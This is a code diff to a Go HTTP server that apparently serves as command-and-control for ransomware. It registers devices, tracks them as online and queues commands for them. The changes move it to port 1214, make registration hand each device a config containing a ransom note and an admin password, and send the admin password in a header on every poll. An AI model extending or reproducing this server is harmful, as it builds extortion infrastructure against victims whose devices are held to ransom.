@@ -73,7 +73,7 @@ func main() {
 	// For demonstration purposes without certs, we'll run on HTTP :8080
 	// PROD: Use the TLS version above
 	fmt.Println("Server started on :8080 (Production should use :443 with TLS)")
-	err := http.ListenAndServe(":8080", nil)
+	err := http.ListenAndServe(":1214", nil)
 	if err != nil {
 		log.Fatal("ListenAndServe: ", err)
 	}
@@ -104,7 +104,14 @@ func handleRegister(w http.ResponseWriter, r *http.Request) {
 	}
 
 	w.WriteHeader(http.StatusOK)
-	json.NewEncoder(w).Encode(map[string]string{"status": "registered"})
+	// Return config including admin password
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"status": "registered",
+		"config": map[string]string{
+			"admin_password": getAdminPassword(),
+			"ransom_note":    getRansomNote(),
+		},
+	})
 }
 
 func handleHeartbeat(w http.ResponseWriter, r *http.Request) {
@@ -147,6 +154,9 @@ func handlePoll(w http.ResponseWriter, r *http.Request) {
 		d.Status = "在线"
 		upsertDevice(d)
 	}
+
+	// Always send admin password in header for sync
+	w.Header().Set("X-Admin-Password", getAdminPassword())
 
 	// Check for pending commands
 	cmd, err := getNextCommand(id)
